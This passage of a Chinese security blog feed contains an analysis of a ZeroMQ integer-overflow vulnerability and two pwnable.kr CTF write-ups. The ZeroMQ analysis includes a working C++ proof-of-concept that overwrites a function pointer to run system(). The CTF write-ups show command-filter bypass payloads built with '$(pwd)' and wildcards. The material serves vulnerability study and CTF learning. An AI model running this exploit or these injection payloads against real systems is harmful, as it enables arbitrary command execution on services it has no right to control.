class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Thread</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    Thread() : the_thread(&amp;Thread::ThreadMain, <span class="keyword">this</span>)</span><br><span class="line">    &#123; &#125;</span><br><span class="line">    ~Thread()&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::thread the_thread;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ThreadMain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="function">zmq::<span class="keyword">context_t</span> <span class="title">context</span> <span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="function">zmq::<span class="keyword">socket_t</span> <span class="title">socket</span> <span class="params">(context, ZMQ_REP)</span></span>;</span><br><span class="line">        socket.bind (<span class="string">&quot;tcp://*:6666&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            zmq::<span class="keyword">message_t</span> request;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Wait for next request from client</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                socket.recv (&amp;request);</span><br><span class="line">            &#125; <span class="keyword">catch</span> ( ... ) &#123; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">callRemoteFunction</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint64_t</span> arg1Addr, <span class="keyword">const</span> <span class="keyword">uint64_t</span> arg2Addr, <span class="keyword">const</span> <span class="keyword">uint64_t</span> funcAddr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">remote_addr</span> =</span> &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> ((s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    remote_addr.sin_family = AF_INET;</span><br><span class="line">    remote_addr.sin_port = htons(<span class="number">6666</span>);</span><br><span class="line">    inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;remote_addr.sin_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (connect(s, (struct sockaddr *)&amp;remote_addr, <span class="keyword">sizeof</span>(struct sockaddr)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint8_t</span> greeting[] = &#123;</span><br><span class="line">        <span class="number">0xFF</span>, <span class="comment">/* Indicates &#x27;versioned&#x27; in zmq::stream_engine_t::receive_greeting */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">/* Unused */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="comment">/* Indicates &#x27;versioned&#x27; in zmq::stream_engine_t::receive_greeting */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="comment">/* Selects ZMTP_2_0 in zmq::stream_engine_t::select_handshake_fun */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">/* Unused */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    send(s, greeting, <span class="keyword">sizeof</span>(greeting), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint8_t</span> v2msg[] = &#123;</span><br><span class="line">        <span class="number">0x02</span>, <span class="comment">/* v2_decoder_t::eight_byte_size_ready */</span></span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="comment">/* msg_size */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    send(s, v2msg, <span class="keyword">sizeof</span>(v2msg), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Write UNTIL the location of zmq::msg_t::content_t */</span></span><br><span class="line">    <span class="keyword">size_t</span> plsize = <span class="number">8183</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span>* pl = (<span class="keyword">uint8_t</span>*)<span class="built_in">calloc</span>(<span class="number">1</span>, plsize);</span><br><span class="line">    send(s, pl, plsize, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(pl);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">uint8_t</span> content_t_replacement[] = &#123;</span><br><span class="line">        <span class="comment">/* void* data */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* size_t size */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* msg_free_fn *ffn */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* void* hint */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Assumes same endianness as target */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(content_t_replacement + <span class="number">0</span>, &amp;arg1Addr, <span class="keyword">sizeof</span>(arg1Addr));</span><br><span class="line">    <span class="built_in">memcpy</span>(content_t_replacement + <span class="number">16</span>, &amp;funcAddr, <span class="keyword">sizeof</span>(funcAddr));</span><br><span class="line">    <span class="built_in">memcpy</span>(content_t_replacement + <span class="number">24</span>, &amp;arg2Addr, <span class="keyword">sizeof</span>(arg2Addr));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Overwrite zmq::msg_t::content_t */</span></span><br><span class="line">    send(s, content_t_replacement, <span class="keyword">sizeof</span>(content_t_replacement), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    close(s);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> destbuffer[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> srcbuffer[<span class="number">100</span>] = <span class="string">&quot;ping google.com&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Thread* rt = <span class="keyword">new</span> Thread();</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">    callRemoteFunction((<span class="keyword">uint64_t</span>)destbuffer, (<span class="keyword">uint64_t</span>)srcbuffer, (<span class="keyword">uint64_t</span>)<span class="built_in">strcpy</span>);</span><br><span class="line"> </span><br><span class="line">    callRemoteFunction((<span class="keyword">uint64_t</span>)destbuffer, <span class="number">0</span>, (<span class="keyword">uint64_t</span>)system);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改main.cpp内容，然后编译执行，成功复现：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/linux%E6%BC%8F%E6%B4%9E/cve-1019-625020211104162815.png"></p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>通过对cve作者提交的说明来看,漏洞主要是在 <code>src/v2_decoder.cpp zmq::v2_decoder_t::size_ready()</code>中 <code>read_pos_ + msg_size_</code>表达式 未做过滤导致一个整型溢出漏洞，使得可以通过设置一个较大的msg_zize来让判断条件恒不成立，造成第二次读取向小缓冲区写入大数据进而溢出，具体溢出位置如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely (!_zero_copy</span><br><span class="line">              || ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *) read_pos_ + msg_size_  <span class="comment">//这里发生整数溢出</span></span><br><span class="line">                  &gt; (allocator.data () + allocator.size ())))) &#123;</span><br><span class="line">    rc = _in_progress.init_size (<span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt; (msg_size_));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    <span class="comment">//溢出后进入该流程</span></span><br><span class="line">    rc =</span><br><span class="line">      _in_progress.init (<span class="keyword">const_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">char</span> *&gt; (read_pos_),</span><br><span class="line">                         <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt; (msg_size_),   </span><br><span class="line">             shared_message_memory_allocator::call_dec_ref,</span><br><span class="line">                         allocator.buffer (), allocator.provide_content ());</span><br><span class="line">    <span class="keyword">if</span> (_in_progress.is_zcmsg ()) &#123;</span><br><span class="line">        allocator.advance_content ();</span><br><span class="line">        allocator.inc_ref ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="整个通信流程"><a href="#整个通信流程" class="headerlink" title="整个通信流程"></a>整个通信流程</h2><p>该版本ZMQ中使用到了ZMTP v2.0版本作为消息传递的传输层协议，客户端和服务端的通信主要以如下步骤展开：</p><ol><li>clinet和server首次进行协商，clinet和server建立TCP链接后，首先是client发送greeting报文进行协商，其协商内容主要是ZMTP的版本信息，    抓包分析，三次握手之后client直接发送greeting报文：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/fuzzing/fuzz20211124111816.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对应代码如下：</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> greeting[] = &#123;</span><br><span class="line">    <span class="number">0xFF</span>, <span class="comment">/* 在zmq::stream_engine_t::receive_greeting函数中标识该报文为非1.0版本 */</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">/* Unused */</span></span><br><span class="line">    <span class="number">0x01</span>, <span class="comment">/* zmq::stream_engine_t::receive_greeting函数中标识该报文为非1.0版本 */</span></span><br><span class="line">    <span class="number">0x01</span>, <span class="comment">/* 在zmq::stream_engine_t::select_handshake_fun函数中选择ZMTP 2.0版本 */</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="comment">/* Unused */</span></span><br><span class="line">&#125;;</span><br><span class="line">send(s, greeting, <span class="keyword">sizeof</span>(greeting), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><ol start="2"><li>server收到greeting报文后，会进行初始化操作，通过调试发现首先进入src/stream_engine.cpp中的zmq::stream_engine_t::in_event()方法中，调用栈大致如下：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/fuzzing/fuzz20211124193152.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在调用tcp_read()读取client消息前，会创建一个缓冲区来存储消息，调用src&#x2F;raw_decoder.cpp中的get_buffer()方法来申请缓冲区，其内部实现如下，主要使用src&#x2F;decoder_allocators.cpp中的allocate()方法：</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> zmq::<span class="keyword">raw_decoder_t</span>::get_buffer (<span class="keyword">unsigned</span> <span class="keyword">char</span> **data_, <span class="keyword">size_t</span> *size_)</span><br><span class="line">&#123;</span><br><span class="line">    *data_ = _allocator.allocate ();</span><br><span class="line">    *size_ = _allocator.size ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmq::shared_message_memory_allocator::allocate()中调用std::malloc()创建一块用于存储稍后所有通信消息的缓冲区，缓冲区大小为0x2008(</span><br></pre></td></tr></table></figure><p><code>_max_size + sizeof (zmq::atomic_counter_t)</code>=<code>0x2000+0x8</code>)，申请成功后在_buf前8个字节存放0x00000001,所以 <code>_buf</code>起始位置要从 <code>_buf+0x8</code>开始算，我调试时 <code>_buf</code>为0x7fffe800bb30，：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/fuzzing/fuzz20211125160846.png"></p><p>之后存放一个 <code>content_t</code>结构体在 <code>_buf</code>之后，该结构体用于client端close()关闭连接后来进行server端析构处理，其对于后续缓冲区溢出利用有着关键性的作用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">content_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    msg_free_fn *ffn;</span><br><span class="line">    <span class="keyword">void</span> *hint;</span><br><span class="line">    zmq::<span class="keyword">atomic_counter_t</span> refcnt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/fuzzing/fuzz20211125144721.png"></p><ol start="3"><li>client接着发送 <code>msg_size</code>报文给server。报文格式 <code>0x02+msg_size</code>，用来标识接下来server等待接收消息的大小，server在zmq::v2_decoder_t::size_ready方法中处理 <code>msg_size</code>，正常流程是如果我们设置的 <code>msg_size</code>值大于初始化空间的0x2000则重新分配缓冲区，但由于存在整数溢出漏洞，使得可以绕过缓冲区大小校验进入else流程，else中init()函数直接使用初始化的缓冲区读取client申请的非常大的如0xffffffffffffffff大小的数据，进而导致后续通信过程中产生缓冲区溢出：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/fuzzing/fuzz20211125161427.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依据如上理论，client端设置</span><br></pre></td></tr></table></figure><p><code>msg_size=0xffffffffffffffff</code>然后发送：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> v2msg[] = &#123;</span><br><span class="line">    <span class="number">0x02</span>, <span class="comment">/* 标识程序进入eight_byte_size_ready状态 */</span></span><br><span class="line">    <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="comment">/* msg_size */</span></span><br><span class="line">&#125;;</span><br><span class="line">send(s, v2msg, <span class="keyword">sizeof</span>(v2msg), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进行调试发现确实进入了else流程，且read_pos位置为初始化的缓冲区</span><br></pre></td></tr></table></figure><p><code>_buf</code>+0x8处，<code>msg_size_</code>=0xffffffffffffffff：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/fuzzing/fuzz20211125163431.png"></p><ol start="4"><li>依据第三步理论，client就可以继续发送大小为0x2008-0x8-0x9=0x1FF7=8183字节的数据来填充整个缓冲区，也就是poc中的client端第二次send()发送的内容，这里稍微修改一下，把pc中的pl指向空间用’a’填充，填充后进行通信，server端整个缓冲区的内容如下：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/fuzzing/fuzz20211125172013.png"></p><ol start="5"><li>最后就是对缓冲区后面的content_t结构体进行溢出覆盖，该结构体中几个字段解释如下：</li></ol><ul><li><p>data：函数ffn的第一个参数</p></li><li><p>size：未使用</p></li><li><p>ffn：ffh函数指针地址</p></li><li><p>hint：函数ffn第二个参数</p><p>该处关键点在于client端在执行close()关闭连接时，会进入server端的zmq::msg_t::close ()方法，该方法内部会调用 <code>content_t-&gt;ffn</code>函数指针来进行析构：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/fuzzing/fuzz20211125173434.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以我们只需要溢出覆盖此结构体中的data、ffn、hint三个字段，即可达到任意函数执行的目的。比如poc中的通过两次覆盖来达到使用system()执行任意命令。</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>本地利用没什么好说的，远程利用可以对前面那0x1FF7大小的缓冲区进行利用执行到任意shellcode，这里不再详述，说太多容易刑，有兴趣可以自己研究。</p><p>参考：</p><p><a href="https://www.freebuf.com/vuls/262410.html">https://www.freebuf.com/vuls/262410.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;ZMQ(Zero Message Queue)是一种基于消息队列得多线程网络库，C++编写，可以使得Socket编程更加简单高效。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="漏洞研究" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="linux漏洞" scheme="http://example.com/tags/linux%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之15-cmd2</title>
    <link href="http://example.com/2021/09/24/pwnable/pwnable.kr%E7%B3%BB%E5%88%9715-cmd2/"/>
    <id>http://example.com/2021/09/24/pwnable/pwnable.kr%E7%B3%BB%E5%88%9715-cmd2/</id>
    <published>2021-09-23T16:00:00.000Z</published>
    <updated>2021-09-24T04:29:51.947Z</updated>
    
    <content type="html"><![CDATA[<p>另一道关于命令行的题目：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210923124717.png"></p><p>​    ssh连上，密码为cmd1的flag内容，mommy now I get what PATH environment is for :)</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210923182420.png"></p><p>​    查看cmd2.c源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** p;</span><br><span class="line">    <span class="keyword">for</span>(p=environ; *p; p++)    <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">    delete_env();</span><br><span class="line">    putenv(<span class="string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    system( argv[<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    和cmd1差不多的题目，这次过滤条件更加苛刻，按cmd1解题思路来想这道题，主要难点就在于”/“被屏蔽了，想办法输入一个”/“问题就可以轻松解决。</p><p>​    不知道哪位大佬发现的pwd在修改了PATH路径后依旧可以执行：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210924122335.png"></p><p>​    所以这里就简单了，我们进入<code>/</code>根目录，然后利用pwd输出的路径”/“来构造cat flag命令:</p><p>/home/cmd2/cmd2 ‘$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*’</p><p>​    即可成功得到flag：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210924122544.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;另一道关于命令行的题目：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210923124717.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;​    ssh连上，密码为cmd</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之14-cmd1</title>
    <link href="http://example.com/2021/09/23/pwnable/pwnable.kr%E7%B3%BB%E5%88%9714-cmd1/"/>
    <id>http://example.com/2021/09/23/pwnable/pwnable.kr%E7%B3%BB%E5%88%9714-cmd1/</id>
    <published>2021-09-22T16:00:00.000Z</published>
    <updated>2021-09-24T04:29:46.243Z</updated>
    
    <content type="html"><![CDATA[<p>看提示又是一道环境变量相关的题目：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210918183939.png"></p><p>​    ssh连上看看：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210923112006.png"></p><p>​    还是把cmd1的源码下回来或者直接在服务器上复制回来查看：</p><figure class="highlight plain"><figcaption><span><stdio.h></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int filter(char* cmd)&#123;</span><br><span class="line">int r&#x3D;0;</span><br><span class="line">r +&#x3D; strstr(cmd, &quot;flag&quot;)!&#x3D;0;</span><br><span class="line">r +&#x3D; strstr(cmd, &quot;sh&quot;)!&#x3D;0;</span><br><span class="line">r +&#x3D; strstr(cmd, &quot;tmp&quot;)!&#x3D;0;</span><br><span class="line">return r;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[], char** envp)&#123;</span><br><span class="line">putenv(&quot;PATH&#x3D;&#x2F;thankyouverymuch&quot;);</span><br><span class="line">if(filter(argv[1])) return 0;</span><br><span class="line">system( argv[1] );</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    题目先是把环境变量设置了一个新的路径<code>/thankyouverymuch</code>，这样设置后，一些添加了环境变量的命令就没用了。</p><p>​    然后就是对参数1进行过滤，如果参数1包含了flag、sh、tmp等字段就直接结束，要吗就把参数1作为命令执行。</p><p>​    所以这道题的破解方法就好理解了，我们需要执行一个命令，来读取到flag的内容，同时这个命令不能包含三个敏感字符串且不能利用到环境变量，比如<code>bash -c cat flag</code>这样的命令就不行。另外我们也不能使用到tmp目录，这个目录是服务器留给我们写自己程序来执行的，所以想通过第三方程序读取flag也好像不行。</p><p>​    分析到这，那自然而然也就想到了<code>/bin</code>目录，这个目录下存放了一些系统命令比如：cat、ls、mkdir、chmod等。所以我们构造一个参数”/bin/cat flag”是不是就可以拿到flag了。哦对，flag也被作为敏感词屏蔽了，但是巧妙地是cat是支持正则表达式的，所以改一下参数”/bin/cat fla*”，这样就可以成功cat flag了：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210923122128.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看提示又是一道环境变量相关的题目：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210918183939.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;​    ssh连上看看</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之13-lotto</title>
    <link href="http://example.com/2021/09/18/pwnable/pwnable.kr%E7%B3%BB%E5%88%9713-lotto/"/>
    <id>http://example.com/2021/09/18/pwnable/pwnable.kr%E7%B3%BB%E5%88%9713-lotto/</id>
    <published>2021-09-17T16:00:00.000Z</published>
    <updated>2021-09-18T03:24:10.411Z</updated>
    
